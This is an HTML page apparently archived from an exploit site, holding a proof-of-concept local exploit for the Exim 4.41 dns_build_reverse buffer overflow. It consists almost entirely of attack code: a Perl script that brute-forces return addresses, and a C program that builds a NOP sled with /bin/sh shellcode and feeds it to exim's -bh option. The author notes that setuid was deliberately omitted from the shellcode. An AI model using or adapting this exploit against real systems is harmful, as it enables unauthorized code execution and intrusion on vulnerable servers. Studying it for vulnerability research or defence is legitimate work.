<html><head><title>Exim <= 4.41 dns_build_reverse Local Exploit PoC</title></head><pre>/*
This proof-of-concept demonstrates the existence of the vulnerability
reported by iDEFENSE (iDEFENSE Security Advisory 01.14.05).
It has been tested against exim-4.41 under Debian GNU/Linux.
Note that setuid () is not included in the shellcode to avoid
script-kidding.
My RET is 0xbffffae4, but fb.pl can brute-force it for you.

-----------
Brute Force fb.pl:
-----------

#!/usr/bin/perl

$cnt = 0xbffffa10;

while (1) {
   $hex = sprintf (&quot;0x%x&quot;, $cnt);
   $res = system (&quot;./exploit $hex&quot;);
   printf &quot;$hex : $res\n&quot;;
   $cnt += 4;
}

---------
exploit.c:
---------
*/

#define NOP 0x90
#define TAMBUF 368
#define INIC_SH 20
#include &lt;stdlib.h&gt;

int main (int argc, char **argv) {

   static char shellcode[]=
   &quot;\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89&quot;
   &quot;\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e&quot;
   &quot;\x2f\x73\x68\x58&quot;;

   char buffer [TAMBUF + 1];
   char cadena [TAMBUF + 5];
   int cont;
   unsigned long ret = strtoul (argv[1], NULL, 16);

   for (cont = 0; cont &lt; TAMBUF / 4; cont++)
           *( (long *) buffer + cont) = ret;

   for (cont = 0; cont &lt; strlen (shellcode); cont++)
           buffer [cont + INIC_SH] = shellcode [cont];

   for (cont = 0; cont &lt; INIC_SH; cont++)
           buffer [cont] = NOP;

   buffer [TAMBUF] = 0;
   printf (&quot;RET = 0x%x\n&quot;, ret);
   strcpy (cadena, &quot;::%A&quot;);
   strcat (cadena, buffer);
       execl (&quot;/usr/sbin/exim&quot;, &quot;./exim&quot;, &quot;-bh&quot;, cadena, (char *) 0);
}

// milw0rm.com [2005-01-15]</pre></html>